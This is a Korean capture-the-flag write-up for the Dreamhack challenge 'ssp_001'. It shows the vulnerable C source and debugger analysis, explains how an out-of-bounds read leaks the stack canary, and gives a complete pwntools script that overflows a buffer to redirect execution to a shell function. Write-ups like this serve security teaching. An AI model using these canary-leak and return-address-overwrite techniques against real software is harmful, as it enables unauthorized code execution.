ssp_001 라이트업
============

<img width="387" height="247" alt="image" src="https://github.com/user-attachments/assets/9f7ba0b9-31a4-40b6-98f8-8e3198dca874" />

일단 환경을 먼저 체크하면, 바이너리에는 카나리와 nx가 적용되어 있다. 

nx가 적용되어 있기 때문에 임의의 위치에 쉘코드를 집어넣은 후 그 주소의 코드를 바로 실행시킬 수 없다. 또한 카나리가 존재
하기때문에 스택 맨 위의 값이 변경되어서는 안되고, sfp, ret과 그 뒷 주소를 변경하려면 카나리 값을 유지하면서 변경해야 한다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}

void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}

int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```


일단 코드를 보면 main함수의 반환 주소에 get_shell 함수의 주소를 넣어 쉘을 획득할 수 있는 것을 확인 가능하다. 
또한 원하는 길이의 문자열을 name에 입력받을 수 있으므로 버퍼 오버플로우 취약점이 발생한다.


### 디버깅

<img width="877" height="517" alt="image" src="https://github.com/user-attachments/assets/9051220f-6dff-46b3-b2f7-4fa01bc6a160" />

<img width="780" height="280" alt="image" src="https://github.com/user-attachments/assets/f3834a8c-7ddb-461c-b0ba-7c65e916965b" />

* gs:0x14로부터 임의의 값을 받아와 [ebp-0x8] 에 저장하고, main함수가 리턴하기 전에 값이 변조되지 않았는지 확인한다. 
* gs:0x14와 [ebp-0x8]를 xor연산한 값이 0과 같을 시 0x08048884 <+345>으로 점프해 __stack_chk_fail 함수를 호출하지 않고 통과한다.

따라서 [ebp-0x8]의 주소의 4개의 바이트를 알아내면 문제를 해결할 수 있다.

### box, name 주소 확인

```c
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
```

<img width="812" height="165" alt="image" src="https://github.com/user-attachments/assets/2d1e09e4-e401-4de6-a212-35d7de5d6c96" />

main 함수에서 F 명령에 해당하는 부분이다.

---------------------------

```c
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
```

<img width="763" height="276" alt="image" src="https://github.com/user-attachments/assets/3b725a31-57fb-4d43-9e1d-54754abd0ed9" />

main 함수에서 P 명령에 해당하는 부분이다.

------------------------------

```c
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
```

<img width="840" height="375" alt="image" src="https://github.com/user-attachments/assets/2569337e-518f-4831-a90d-69075399e315" />

main 함수에서 E 명령에 해당하는 부분이다.

----------------------------

**결론적으로 name 의 주소는 [ebp-0x48], box의 주소는 [ebp-0x88]임을 확인할 수 있다.**



### 익스플로잇 코드 작성

#### 카나리 값 획득
box의 idx를 0x80 ~ 0x84로 설정해주면 [ebp-0x8] ~ [ebp-0x4] 사이의 카나리 4바이트를 읽을 수 있다.

#### ret 덮기

획득한 카나리와 함께 페이로드를 작성하여 ret을 덮을 수 있다.

<img width="741" height="60" alt="image" src="https://github.com/user-attachments/assets/b43c628a-98b2-4bba-beeb-93e462f45d29" />

ret에는 p32(0x80486b9)를 덮으면 된다.

name의 주소가 [ebp-0x48] 이므로 0x40번째에 카나리를 넣어 [ebp-0x8]가 다시 들어가게 설정해야 한다. 
그리고 ret에 p32(0x80486b9)을 넣어주면 된다.


### 익스플로잇 코드

```python
from pwn import *

e = ELF('./ssp_001')
p = remote('host8.dreamhack.games', 15624)

canary = b''
get_shell = e.symbols['get_shell'] 


for i in range(0x83, 0x7f, -1) : 
    p.sendafter('> ','P') 
    p.sendlineafter(' : ', bytes(str(i),'utf-8')) 
    p.recvuntil(' : ')
    canary += p.recv(2)

canary = int(canary,16)
print('canary : 0x%08x'%canary)
payload = b''
payload += b'A' * 0x40
payload += p32(canary)
payload += b'B'*4 # dummy
payload += b'C'*4 # ebp
payload += p32(get_shell) # ret -> get_shell

p.sendafter('> ', 'E')
p.sendlineafter(' : ', bytes(str(len(payload)),'utf-8')) # name_len -> trigger bof
p.sendafter(' : ',payload)
p.interactive()
```

### 코드 분석

#### 1. 카나리 Leak


* `p.sendafter('> ', 'P')`: 프로그램의 프롬프트(`> `)가 나올 때까지 기다린 후 명령어를 보내 이름을 출력하는 기능을 활성화한다.
* `p.sendlineafter(' : ', bytes(str(i),'utf-8'))`: 명령어를 보낸 후 나오는 프롬프트(` : `)에 원하는 오프셋을 보낸다. scanf에서 그냥 sendline쓰니까 계속 오류가 나서 sendafter하고 sendlineafter를 써야 했다.
* `canary = int(canary, 16)`: 모은 16진수 문자열을 최종적으로 정수형 카나리 값으로 변환한다. 

#### 2. 페이로드 전송


* `get_shell = e.symbols['get_shell']`: ELF 파일에서 `get_shell` 함수의 주소를 불러온다.
* `payload = b'' + b'A' * 0x40`: 버퍼 크기인 `0x40` (64바이트)만큼 더미값을 채운다.
* `payload += p32(canary)`: 더미 값 뒤에 유출한 카나리 값을 그대로 넣는다. 
* `payload += b'B'*4 # dummy`, `payload += b'C'*4 # ebp`: 카나리 뒤에 있는 4바이트의 스택 프레임 포인터(EBP)와 그 앞에 있는 더미 바이트를 덮어쓰기 위해 더미 값을 추가한다.
* `payload += p32(get_shell)`: 마지막으로 리턴 주소를 `get_shell` 함수의 주소로 덮어씌운다.
* `p.sendafter('> ', 'E')`: 'E' 명령어를 보내 이름을 수정하는 기능을 활성화한다.
* `p.sendlineafter(' : ', bytes(str(len(payload)),'utf-8'))`: `scanf` 함수에 페이로드의 길이를 알려준다.



### 실행 결과
<img width="487" height="151" alt="image" src="https://github.com/user-attachments/assets/9705e73a-4696-4231-b9fc-d16fbacbc507" />

이렇게 플래그를 확인 가능하다. 
